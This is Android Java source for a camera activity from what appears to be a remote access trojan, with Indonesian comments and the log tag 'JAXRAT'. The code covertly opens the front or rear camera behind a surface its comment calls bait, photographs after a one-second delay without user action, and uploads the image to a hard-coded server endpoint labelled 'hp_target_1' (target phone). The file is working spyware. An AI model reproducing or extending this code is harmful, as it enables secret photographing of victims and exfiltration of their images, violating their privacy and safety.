package com.ezax.agent;

import android.Manifest;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.widget.FrameLayout;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class CameraActivity extends AppCompatActivity {
    private Camera camera;
    private int cameraId = 0;
    private boolean isFront = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Bikin SurfaceView transparan buat pancingan biar kamera mau jalan
        FrameLayout layout = new FrameLayout(this);
        SurfaceView surfaceView = new SurfaceView(this);
        layout.addView(surfaceView);
        setContentView(layout);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            finish(); return;
        }

        isFront = getIntent().getBooleanExtra("FRONT", false);

        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
            @Override
            public void surfaceCreated(SurfaceHolder holder) {
                startCamera(holder);
            }
            @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}
            @Override public void surfaceDestroyed(SurfaceHolder holder) {}
        });
    }

    private void startCamera(SurfaceHolder holder) {
        try {
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            int cameraCount = Camera.getNumberOfCameras();
            
            for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
                Camera.getCameraInfo(camIdx, cameraInfo);
                if (isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    cameraId = camIdx;
                    break;
                } else if (!isFront && cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    cameraId = camIdx;
                    break;
                }
            }

            camera = Camera.open(cameraId);
            camera.setPreviewDisplay(holder);
            camera.startPreview();

            // Jeda dikit biar autofokus nyesuaiin
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                camera.takePicture(null, null, (data, cam) -> {
                    uploadImage(data);
                });
            }, 1000);

        } catch (Exception e) {
            Log.e("JAXRAT", "Kamera Error", e);
            finish();
        }
    }

    private void uploadImage(byte[] imageBytes) {
        new Thread(() -> {
            try {
                // PASTIKAN IP INI SESUAI DENGAN LAPTOP KAMU SEKARANG
                String serverUrl = "http://192.168.1.14:5000/api/upload_image/hp_target_1"; 
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                String boundary = "***";
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream request = new DataOutputStream(conn.getOutputStream());
                request.writeBytes("--" + boundary + "\r\n");
                request.writeBytes("Content-Disposition: form-data; name=\"image\";filename=\"image.jpg\"\r\n\r\n");
                request.write(imageBytes);
                request.writeBytes("\r\n--" + boundary + "--\r\n");
                request.flush(); request.close();

                int responseCode = conn.getResponseCode();
                Log.d("JAXRAT", "Upload Foto Selesai: " + responseCode);
            } catch (Exception e) { Log.e("JAXRAT", "Upload Error", e); }
            
            runOnUiThread(this::finish);
        }).start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
}
